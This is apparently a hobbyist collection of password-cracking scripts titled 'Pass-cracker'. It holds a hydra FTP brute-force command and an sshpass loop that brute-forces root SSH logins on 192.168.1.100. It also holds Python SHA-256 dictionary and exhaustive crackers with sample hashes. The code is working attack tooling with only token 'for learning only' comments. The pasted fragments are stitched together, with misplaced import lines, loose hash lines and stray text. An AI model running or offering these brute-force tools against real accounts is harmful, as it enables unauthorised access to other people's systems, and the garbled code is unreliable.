# Pass-cracker 
#!/bin/bash
# Simulate brute-force by guessing a known password

passwords=("123456" "admin" "letmein" "secret123" "root")
target="secret123"

for p in "${passwords[@]}"; do
    echo "Trying: $p"
    if [ "$p" == "$target" ]; then
        echo "Password FOUND: $p"
        break
    fi
done
#!/bin/bash
# Simulated brute-force attack on a target password (for learning only)

target="hunter2"  # The correct password
wordlist="wordlist.txt"

while IFS= read -r password; do
    echo "Trying: $password"
    if [ "$password" == "$target" ]; then
        echo "[+] Password found: $password"
        exit 0
    fi
done < "$wordlist"

echo "[-] Password not found"
chmod +x bruteforce.sh
hydra -l admin -P wordlist.txt ftp://192.168.1.100
#!/bin/bash

target="192.168.1.100"
username="root"
wordlist="wordlist.txt"

while IFS= read -r password; do
    echo "Trying password: $password"
    
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $username@$target "exit" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "[+] Password found: $password"
        exit 0
    fi
done < "$wordlist"

echo "[-] Password not found"
import hashlib

def crack_password(hash_to_crack, wordlist_file):
    with open(wordlist_file, 'r') as file:
        for word in file:
            word = word.strip()
            word_hash = hashlib.sha256(word.encode()).hexdigest()
            print(f"Trying: {word}")
            if word_hash == hash_to_crack:
                print(f"[+] Password found: {word}")
                return
    print("[-] Password not found.")

# Example usage
hash_to_crack = hashlib.sha256("secret123".encode()).hexdigest()
crack_password(hash_to_crack, "wordlist.txt")
import hashlib

# Target SHA-256 hash (this is of "secret123")
target_hash = "fcf730b6d95236ecd3c9fc2d92d7b6b2bb061514961aec041d6c7a7192f592e4"

# Load wordlist from file
def load_wordlist(filepath):
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[-] Wordlist file not found: {filepath}")
        exit()

# Brute-force function
def crack_sha256_hash(hash_to_crack, wordlist):
    for word in wordlist:
        hashed_word = hashlib.sha256(word.encode()).hexdigest()
        print(f"Trying: {word}")
        if hashed_word == hash_to_crack:
            print(f"[+] Password found: {word}")
            return
    print("[-] Password not found.")

# Main
if __name__ == "__main__":
    wordlist = load_wordlist("wordlist.txt")
    crack_sha256_hash(target_hash, wordlist)
    import hashlib
import itertools
import string

# Target SHA-256 hash (this is "abc")
target_hash = "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"

# Character set to use
charset = string.ascii_lowercase  # You can also add digits, symbols, etc.

# Brute-force password generator
def crack_sha256(target_hash, max_length):
    for length in range(1, max_length + 1):
        for guess in itertools.product(charset, repeat=length):
            password = ''.join(guess)
            hashed = hashlib.sha256(password.encode()).hexdigest()
            print(f"Trying: {password}")
            if hashed == target_hash:
                print(f"[+] Password found: {password}")
                return password
    print("[-] Password not found.")
    return None

# Run
if __name__ == "__main__":
    crack_sha256(target_hash, max_length=4)  # Increase to 5 or 6 for harder guesses
    import hashlib
import itertools
import string

# Load hashes from file into a set
def load_hashes(filename):
    try:
        with open(filename, 'r') as f:
            return set(line.strip() for line in f if line.strip())
    except FileNotFoundError:
        print(f"[-] Could not find {filename}")
        exit()

# Brute-force generator for passwords
def brute_force_hashes(hash_set, charset, max_length):
    found = {}

    for length in range(1, max_length + 1):
        for guess_tuple in itertools.product(charset, repeat=length):
            guess = ''.join(guess_tuple)
            guess_hash = hashlib.sha256(guess.encode()).hexdigest()

            if guess_hash in hash_set:
                print(f"[+] Match found! {guess} => {guess_hash}")
                found[guess_hash] = guess
                if len(found) == len(hash_set):
                    return found
            else:
                print(f"Trying: {guess}")

    return found

# Main
if __name__ == "__main__":
    charset = string.ascii_lowercase  # Add more: + string.digits or string.ascii_letters
    max_length = 4  # Adjust for difficulty

    hash_file = "hashes.txt"
    hashes = load_hashes(hash_file)
    results = brute_force_hashes(hashes, charset, max_length)

    print("\n=== Cracked Passwords ===")
    for h in hashes:
        if h in results:
            print(f"{h} : {results[h]}")
        else:
            print(f"{h} : [Not found]")
        ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad  # 'abc'
2e7d2c03a9507ae265ecf5b5356885a5e48eebf11c9c6f78dfb58b6c7d38fddb  # '123'
control+shift+m 
